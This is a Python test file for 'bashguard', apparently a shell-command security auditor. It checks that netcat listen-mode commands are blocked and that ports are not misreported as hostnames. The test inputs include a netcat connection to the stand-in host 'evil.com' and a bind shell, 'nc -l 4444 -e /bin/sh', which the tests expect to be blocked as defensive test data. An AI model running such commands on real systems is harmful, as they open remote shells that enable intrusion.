"""Tests for nc listen-mode host detection fix.

Story: NC-LISTEN-FALSE

Rule contracts (network.unknown_host):
- nc -l PORT  → BLOCK with "potential network access" (NOT "unknown host '4444'")
- nc -lvp PORT → BLOCK with "potential network access" (NOT "unknown host '4444'")
- nc -l -p PORT → BLOCK with "potential network access"
- nc HOST PORT  → BLOCK with "unknown host 'HOST'" (connect mode, correct)
- nc -l PORT -e /bin/sh → BLOCK (shell_via_tool also fires)
"""
from __future__ import annotations

import pytest

from bashguard.auditor import audit
from bashguard.context import make_context
from bashguard.models import VerdictType
from bashguard.policy import decide, PolicyConfig


def _audit(script: str):
    ctx = make_context()
    findings = audit(script, ctx)
    verdict = decide(findings, ctx, PolicyConfig.default())
    return verdict.verdict, findings


class TestNcListenMode:
    # Story: NC-LISTEN-FALSE

    def test_nc_listen_blocked_not_as_host(self):
        """nc -l 4444: blocked but port number must not appear as hostname."""
        verdict, findings = _audit("nc -l 4444")
        assert verdict == VerdictType.BLOCK
        net_findings = [f for f in findings if f.rule_id == "network.unknown_host"]
        assert net_findings, "network.unknown_host must fire"
        for f in net_findings:
            assert "4444" not in f.message or "unknown host" not in f.message, (
                f"Port '4444' must not appear as hostname in: {f.message}"
            )

    def test_nc_listen_combined_flag_blocked_not_as_host(self):
        """nc -lvp 4444: combined listen flag must not treat 4444 as host."""
        verdict, findings = _audit("nc -lvp 4444")
        assert verdict == VerdictType.BLOCK
        net_findings = [f for f in findings if f.rule_id == "network.unknown_host"]
        assert net_findings, "network.unknown_host must fire"
        for f in net_findings:
            assert "4444" not in f.message or "unknown host" not in f.message

    def test_nc_separate_listen_port_blocked_not_as_host(self):
        """nc -l -p 4444: separate flags must not treat 4444 as host."""
        verdict, findings = _audit("nc -l -p 4444")
        assert verdict == VerdictType.BLOCK
        net_findings = [f for f in findings if f.rule_id == "network.unknown_host"]
        assert net_findings, "network.unknown_host must fire"
        for f in net_findings:
            assert "4444" not in f.message or "unknown host" not in f.message

    def test_nc_connect_mode_shows_real_host(self):
        """nc host 4444: connect mode must show the actual hostname."""
        verdict, findings = _audit("nc evil.com 4444")
        assert verdict == VerdictType.BLOCK
        net_findings = [f for f in findings if f.rule_id == "network.unknown_host"]
        assert net_findings, "network.unknown_host must fire"
        assert any("evil.com" in f.message for f in net_findings)

    def test_nc_listen_with_shell_double_blocked(self):
        """nc -l 4444 -e /bin/sh: both network and shell_via_tool fire."""
        verdict, findings = _audit("nc -l 4444 -e /bin/sh")
        assert verdict == VerdictType.BLOCK
        rule_ids = {f.rule_id for f in findings}
        assert "evasion.shell_via_tool" in rule_ids
        net_findings = [f for f in findings if f.rule_id == "network.unknown_host"]
        assert net_findings
        for f in net_findings:
            assert "4444" not in f.message or "unknown host" not in f.message
